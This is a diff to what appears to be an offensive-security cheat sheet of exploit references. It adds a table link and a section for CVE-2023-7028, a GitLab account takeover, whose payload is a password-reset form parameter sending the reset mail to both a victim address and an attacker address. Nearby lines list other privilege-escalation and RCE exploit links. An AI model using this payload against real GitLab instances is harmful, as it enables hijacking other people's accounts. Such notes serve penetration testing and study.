@@ -407,6 +407,7 @@ Thank you for reading.
 | CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
 | CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
 | CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
+| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -5014,6 +5015,14 @@ python3 gen_libc.py
 ```c
 gcc -o exp exp.c
 ./exp
+```
+
+#### CVE-2023-7028: GitLab Account Takeover
+
+> https://github.com/V1lu0/CVE-2023-7028
+
+```c
+user[email][]=valid@email.com&user[email][]=attacker@email.com
 ```
 
 #### GodPotato LPE
